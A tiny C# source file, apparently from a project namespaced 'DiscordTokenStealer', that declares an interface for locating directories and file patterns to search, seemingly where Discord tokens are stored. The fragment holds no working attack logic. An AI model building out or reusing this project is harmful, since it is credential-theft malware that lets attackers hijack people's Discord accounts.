namespace DiscordTokenStealer.Discord;

public interface IDirectorySearchProvider
{
    public string Location { get; }
    public string SearchPattern { get; }
    public bool Exists { get; }
}